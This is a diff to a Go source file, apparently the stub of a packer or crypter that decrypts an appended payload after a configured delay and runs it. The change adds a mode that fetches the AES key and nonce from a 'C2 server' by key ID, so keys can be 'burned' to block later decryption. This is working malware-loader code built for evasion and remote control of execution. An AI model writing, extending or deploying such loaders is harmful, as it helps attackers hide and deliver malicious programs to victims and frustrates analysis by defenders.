@@ -3,6 +3,10 @@
 // after itself, enforces the configured delay, decrypts, and runs
 // the original program.
 //
+// Supports two key modes:
+//   - Local: key and nonce are in the JSON metadata (legacy / no --c2-url)
+//   - Remote: key_id and c2_url are in the metadata; key is fetched from the C2 server
+//
 // Output layout (read from the end):
 //   [stub .exe] [zero padding] [ciphertext] [JSON meta] [metaLen 4B] ["HBX1"]
 package main
@@ -14,6 +18,8 @@ import (
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
+	"io"
+	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -23,12 +29,19 @@ import (
 const magic = "HBX1"
 
 type meta struct {
-	Key           string  `json:"key"`
-	Nonce         string  `json:"nonce"`
+	Key           string  `json:"key,omitempty"`
+	Nonce         string  `json:"nonce,omitempty"`
+	KeyID         string  `json:"key_id,omitempty"`
+	C2URL         string  `json:"c2_url,omitempty"`
 	Delay         float64 `json:"delay"`
 	OriginalName  string  `json:"original_name"`
 	OriginalSize  int     `json:"original_size"`
 	CiphertextLen int     `json:"ciphertext_len"`
+}
+
+type keyResponse struct {
+	Key   string `json:"key"`
+	Nonce string `json:"nonce"`
 }
 
 func main() {
@@ -70,8 +83,21 @@ func main() {
 		time.Sleep(time.Duration(m.Delay * float64(time.Second)))
 	}
 
-	key, _ := base64.StdEncoding.DecodeString(m.Key)
-	nonce, _ := base64.StdEncoding.DecodeString(m.Nonce)
+	var key, nonce []byte
+
+	if m.KeyID != "" && m.C2URL != "" {
+		fmt.Fprintln(os.Stderr, "[INFO] Fetching key from C2 server...")
+		key, nonce, err = fetchKeyFromServer(m.C2URL, m.KeyID)
+		if err != nil {
+			fatal("cannot retrieve key: %v", err)
+		}
+		fmt.Fprintln(os.Stderr, "[INFO] Key retrieved from server.")
+	} else if m.Key != "" && m.Nonce != "" {
+		key, _ = base64.StdEncoding.DecodeString(m.Key)
+		nonce, _ = base64.StdEncoding.DecodeString(m.Nonce)
+	} else {
+		fatal("no key source: metadata has neither key nor key_id")
+	}
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -109,6 +135,38 @@ func main() {
 	cmd.Stderr = os.Stderr
 	cmd.Stdin = os.Stdin
 	cmd.Run()
+}
+
+func fetchKeyFromServer(c2url, keyID string) ([]byte, []byte, error) {
+	resp, err := http.Get(c2url + "/keys/" + keyID)
+	if err != nil {
+		return nil, nil, fmt.Errorf("cannot reach key server at %s: %w", c2url, err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == http.StatusNotFound {
+		return nil, nil, fmt.Errorf("key not found on server (may have been burned)")
+	}
+	if resp.StatusCode != http.StatusOK {
+		body, _ := io.ReadAll(resp.Body)
+		return nil, nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, string(body))
+	}
+
+	var kr keyResponse
+	if err := json.NewDecoder(resp.Body).Decode(&kr); err != nil {
+		return nil, nil, fmt.Errorf("bad response: %w", err)
+	}
+
+	key, err := base64.StdEncoding.DecodeString(kr.Key)
+	if err != nil {
+		return nil, nil, fmt.Errorf("bad key encoding: %w", err)
+	}
+	nonce, err := base64.StdEncoding.DecodeString(kr.Nonce)
+	if err != nil {
+		return nil, nil, fmt.Errorf("bad nonce encoding: %w", err)
+	}
+
+	return key, nonce, nil
 }
 
 func fatal(format string, args ...interface{}) {
